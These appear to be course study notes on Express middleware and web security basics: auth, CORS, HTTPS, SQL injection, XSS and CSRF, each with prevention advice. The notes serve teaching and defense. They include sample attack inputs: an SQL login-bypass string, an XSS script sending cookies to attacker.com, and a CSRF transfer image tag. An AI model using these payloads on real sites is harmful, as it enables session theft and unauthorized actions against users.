# Middleware & Web Security Basics
### Reference Notes — Integrative Programming

---

## PART 1: MIDDLEWARE

## 1. What is Middleware?

**Middleware** is code that sits **in between** a request coming in and the final response going out — it "intercepts" requests/responses to do something (check auth, log data, transform data) before passing control to the next step.

Think of it as a **checkpoint/assembly line** — a request doesn't go straight from client to final logic; it passes through a series of middleware functions first.

```
Client Request
     │
     ▼
┌─────────────┐
│ Middleware 1 │  (e.g., logging)
└─────────────┘
     │  next()
     ▼
┌─────────────┐
│ Middleware 2 │  (e.g., authentication)
└─────────────┘
     │  next()
     ▼
┌─────────────┐
│ Middleware 3 │  (e.g., validation)
└─────────────┘
     │  next()
     ▼
┌─────────────────┐
│ Route Handler /  │  (actual business logic)
│ Controller       │
└─────────────────┘
     │
     ▼
  Response back to Client
```

Each middleware can:
- **Pass control forward** (call `next()`) to continue the chain
- **Modify** the request/response objects
- **Stop the chain early** (e.g., reject an unauthorized request, send an error response)

---

## 2. Why Middleware Matters (Integration Angle)

Middleware is exactly where **separation of concerns** meets **integration** — it's the layer that connects your core app logic to cross-cutting needs (security, logging, external system checks) without cluttering business logic itself.

```js
// ❌ Without middleware — logic tangled together
app.get("/orders", (req, res) => {
  console.log(`Request at ${new Date()}`);       // logging
  if (!req.headers.authorization) {                // auth check
    return res.status(401).send("Unauthorized");
  }
  // ... actual order logic
});

// ✅ With middleware — clean separation
app.use(logger);          // logging middleware
app.use(authenticate);    // auth middleware
app.get("/orders", getOrders); // just business logic
```

---

## 3. Common Types of Middleware

### 3.1 Authentication (Auth) Middleware
Checks whether the request has valid credentials (token, session, API key) before allowing it through.

```js
function authenticate(req, res, next) {
  const token = req.headers.authorization;
  if (!token) return res.status(401).json({ error: "No token provided" });

  try {
    req.user = verifyToken(token); // decode/verify JWT, etc.
    next(); // credentials OK, continue
  } catch (err) {
    res.status(403).json({ error: "Invalid or expired token" });
  }
}
```

### 3.2 Authorization Middleware
Different from authentication — checks **what a verified user is allowed to do** (roles/permissions).

```js
function requireAdmin(req, res, next) {
  if (req.user.role !== "admin") {
    return res.status(403).json({ error: "Admins only" });
  }
  next();
}
```

**Auth vs Authz quick distinction:**
| | Authentication | Authorization |
|---|---|---|
| Question it answers | "Who are you?" | "What are you allowed to do?" |
| Example | Logging in with a password | Checking if a logged-in user can delete a post |

### 3.3 Logging Middleware
Records details about each request (method, URL, timestamp, response time) — useful for debugging and monitoring (see Planning/Scaling doc).

```js
function logger(req, res, next) {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
}
```

### 3.4 Validation Middleware
Checks incoming data (body, query params) against expected rules before it reaches business logic.

```js
function validateOrder(req, res, next) {
  const { productId, quantity } = req.body;
  if (!productId || quantity <= 0) {
    return res.status(400).json({ error: "Invalid order data" });
  }
  next();
}
```

### 3.5 Error-Handling Middleware
Catches errors thrown anywhere earlier in the chain and returns a consistent error response instead of crashing the app.

```js
function errorHandler(err, req, res, next) {
  console.error(err.stack);
  res.status(500).json({ error: "Something went wrong" });
}
```

### 3.6 CORS Middleware
Adds headers to allow (or restrict) requests from other domains/origins — covered in depth in Part 2.

### 3.7 Rate-Limiting/Throttling Middleware
Blocks a client after too many requests in a time window (relates to scaling/security both).

```js
// Example using express-rate-limit
const rateLimit = require("express-rate-limit");
app.use(rateLimit({ windowMs: 60000, max: 100 })); // 100 requests/min
```

---

## 4. API Gateway — Middleware at the System Level

An **API Gateway** is essentially "middleware for a whole system" — a single entry point that sits in front of multiple backend services (especially in microservices architecture) and handles cross-cutting concerns **before** requests reach any individual service.

```
                         ┌───────────────┐
                         │  API GATEWAY  │
     Client ────────────►│ - Auth         │
                         │ - Rate limiting│
                         │ - Routing      │
                         │ - Logging      │
                         └───────┬────────┘
                    ┌────────────┼────────────┐
                    ▼            ▼             ▼
              ┌──────────┐ ┌──────────┐ ┌──────────┐
              │  User    │ │  Order   │ │ Payment  │
              │ Service  │ │ Service  │ │ Service  │
              └──────────┘ └──────────┘ └──────────┘
```

**What an API Gateway typically handles:**
- **Routing** – directs each request to the correct backend service
- **Authentication/Authorization** – verifies identity once, centrally
- **Rate limiting** – protects all services from overload
- **Load balancing** – spreads traffic across service instances
- **Request/response transformation** – e.g., converting between formats for different clients
- **Aggregation** – combining responses from multiple services into one response for the client

**Why it matters for integration:** it's the standard pattern for cleanly connecting multiple independent systems/services to outside clients without every service reimplementing auth, logging, etc.

**Common tools:** Kong, AWS API Gateway, Nginx, Apigee, Express Gateway.

---

## 5. Middleware Order Matters

Middleware runs **in the order it's registered** — putting things in the wrong order causes bugs.

```js
// ❌ Bad order — validates before checking if user is even logged in
app.use(validateOrder);
app.use(authenticate);

// ✅ Good order — authenticate first, then validate business data
app.use(authenticate);
app.use(validateOrder);
```

**General good ordering:** Logging → CORS → Rate Limiting → Authentication → Authorization → Validation → Route Handler → Error Handler (last, catches everything above it).

---

## PART 2: WEB SECURITY BASICS

## 6. Why Security Belongs in Integrative Programming

Every time your system connects to another system (API, third-party service, database, client browser), it opens a new door — and every door needs to be secured. Security isn't a separate topic bolted on at the end; it's part of how systems integrate safely.

---

## 7. HTTPS / SSL/TLS

**HTTP** sends data in plain text — anyone intercepting the connection (public Wi-Fi, ISP, attacker) can read it.
**HTTPS** = HTTP + **encryption** via **SSL/TLS** (TLS is the modern version; "SSL" is still used as the common term).

```
HTTP:   Client ──(plain text: password123)──► Server   ❌ readable if intercepted
HTTPS:  Client ──(encrypted: x9$kD#2...)─────► Server   ✅ unreadable if intercepted
```

**How it works (simplified):**
1. Server presents an **SSL/TLS certificate** (issued by a trusted Certificate Authority)
2. Browser verifies the certificate is valid/trusted
3. Client and server perform a "handshake" to agree on encryption keys
4. All further data is encrypted in transit

**Why it matters:**
- Protects sensitive data (passwords, tokens, payment info) from eavesdropping
- Confirms you're actually talking to the real server (prevents impersonation)
- Required for most modern browser features and SEO ranking
- Padlock icon 🔒 in the browser = HTTPS is active

---

## 8. CORS (Cross-Origin Resource Sharing)

By default, browsers block a webpage from one origin (domain) from making requests to a different origin — this is the **Same-Origin Policy**, a core browser security rule. **CORS** is the controlled mechanism that lets a server explicitly allow certain other origins to access it.

**Origin = protocol + domain + port**
```
https://myapp.com:443   vs   https://api.otherapp.com:443   → different origins
```

```
Browser at myapp.com ──► requests data from ──► api.otherapp.com

Without CORS headers: ❌ Blocked by browser
With CORS headers:    ✅ Allowed, if server says so
```

**How the server allows it (response headers):**
```
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
```

```js
// Express example
const cors = require("cors");
app.use(cors({
  origin: "https://myapp.com", // only allow this origin
  methods: ["GET", "POST"]
}));
```

**Common mistake:** using `Access-Control-Allow-Origin: *` (allow everyone) on APIs that handle sensitive/authenticated data — this defeats the purpose of the protection. Only wildcard it for truly public, non-sensitive endpoints.

**Key point for exams:** CORS is a **browser-enforced** rule — it protects users, not servers directly. Server-to-server requests (like from Postman or another backend) aren't blocked by CORS at all.

---

## 9. SQL Injection

An attack where malicious input is crafted to manipulate a database query — happens when user input is inserted directly into SQL without proper handling.

```js
// ❌ VULNERABLE — string concatenation
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

// Attacker enters username: admin' --
// Resulting query:
// SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
// The "--" comments out the password check → attacker logs in as admin without a password!
```

**Prevention — Parameterized Queries / Prepared Statements:**
```js
// ✅ SAFE — parameterized query (value is never treated as executable SQL)
db.query("SELECT * FROM users WHERE username = ? AND password = ?", [username, password]);
```

**Other prevention methods:**
- Use an **ORM** (Object-Relational Mapper) like Sequelize, Prisma, or Eloquent — they parameterize queries by default
- **Input validation** — reject unexpected characters/formats early
- **Least privilege** — database accounts used by the app should have only the permissions they actually need (e.g., no `DROP TABLE` rights for a read-only feature)

---

## 10. XSS (Cross-Site Scripting)

An attack where malicious **JavaScript** gets injected into a page and runs in another user's browser — usually through unescaped user input rendered back into HTML.

```html
<!-- User submits a comment: -->
<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>

<!-- ❌ If rendered directly into the page without escaping: -->
<div>{{ userComment }}</div>  <!-- script executes! Attacker steals session cookies -->
```

**Types of XSS:**
| Type | Description |
|---|---|
| **Stored XSS** | Malicious script is saved (e.g., in a DB comment) and served to every visitor |
| **Reflected XSS** | Script is included in a URL/request and immediately reflected back in the response |
| **DOM-based XSS** | Vulnerability lives in client-side JS that unsafely manipulates the DOM |

**Prevention:**
- **Escape/encode output** — convert `<`, `>`, `&`, `"` etc. into safe HTML entities before rendering user content
- Most modern frontend frameworks (React, Vue, Angular) **auto-escape** content by default — the danger is mainly when devs bypass this (e.g., React's `dangerouslySetInnerHTML`)
- **Content Security Policy (CSP)** headers — restrict what scripts are allowed to run on a page
- **Sanitize** rich input (e.g., if users are allowed to submit limited HTML, use a sanitizer library like DOMPurify)

```js
// ❌ Dangerous
<div dangerouslySetInnerHTML={{ __html: userComment }} />

// ✅ Safe — React escapes this automatically
<div>{userComment}</div>
```

---

## 11. CSRF (Cross-Site Request Forgery)

An attack that tricks a **logged-in** user's browser into unknowingly sending a request to a site they're authenticated with, performing an action they didn't intend.

```html
<!-- Attacker's malicious site (while victim is logged into bank.com) -->
<img src="https://bank.com/transfer?to=attacker&amount=10000">
<!-- Browser automatically sends bank.com's session cookie with this request! -->
```

The bank server sees a valid session cookie and processes the transfer — because browsers automatically attach cookies to requests, even ones triggered by another site.

**Prevention:**
- **CSRF tokens** — server generates a unique, unpredictable token per session/form; requests must include it, and attackers can't guess/access it from another origin
- **SameSite cookies** — set cookies with `SameSite=Strict` or `Lax`, so they aren't sent on cross-site requests
```
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```
- Require **re-authentication** for sensitive actions (e.g., re-enter password before changing account email)
- Check the `Origin`/`Referer` header on sensitive requests as an extra layer

---

## 12. Quick Comparison: XSS vs CSRF vs SQL Injection

| | XSS | CSRF | SQL Injection |
|---|---|---|---|
| **Target** | Other users (via the browser) | A logged-in user's authenticated actions | The database |
| **What's exploited** | Unescaped output rendered as script | Browser auto-sending cookies cross-site | Unsanitized input reaching raw SQL |
| **Main fix** | Escape output, CSP, sanitize input | CSRF tokens, SameSite cookies | Parameterized queries, ORM |

---

## 13. Other Security Basics Worth Knowing

- **HttpOnly cookies** – prevents JavaScript from accessing cookies (mitigates XSS stealing session tokens)
- **Secure cookies** – cookie is only sent over HTTPS
- **Password hashing** – never store plain-text passwords; use bcrypt/argon2 (one-way hash + salt)
- **Environment variables** – never hardcode secrets (API keys, DB passwords) in source code; use `.env` files excluded from version control
- **Least privilege principle** – every user/service/API key should have only the access it actually needs
- **Input validation on both client AND server** – client-side validation is for UX; server-side validation is for actual security (client-side can always be bypassed)

---

## 14. Middleware + Security Checklist

- [ ] Is authentication middleware checked before any protected route logic runs?
- [ ] Is authorization (role/permission) checked separately from authentication?
- [ ] Is CORS configured to allow only trusted origins (not `*` for sensitive APIs)?
- [ ] Are all database queries parameterized (no raw string concatenation)?
- [ ] Is user-generated content escaped/sanitized before being rendered?
- [ ] Are cookies set with `HttpOnly`, `Secure`, and `SameSite` attributes?
- [ ] Is the app served over HTTPS in production?
- [ ] Are secrets/API keys kept out of source code (environment variables)?
- [ ] Is there rate limiting on sensitive endpoints (login, password reset)?
- [ ] Is there a global error-handling middleware so errors don't leak stack traces to users?

---

## 15. Key Takeaways

- **Middleware** is the "in-between" layer that handles cross-cutting concerns (auth, logging, validation) before a request reaches business logic — order of execution matters.
- An **API Gateway** applies the middleware concept at the system/architecture level, especially in microservices.
- **HTTPS** encrypts data in transit; **CORS** controls which origins a browser is allowed to request data from.
- **SQL Injection, XSS, and CSRF** are the three classic web vulnerabilities — each has a distinct target and a well-established fix (parameterized queries, output escaping, CSRF tokens/SameSite cookies respectively).
- Security in integrative programming isn't an afterthought — it's built into how systems trust and talk to each other.

---

*Note: I don't have live document/database access — this is compiled from general software engineering knowledge, so cross-check specific tools/terms against what your professor/course requires.*
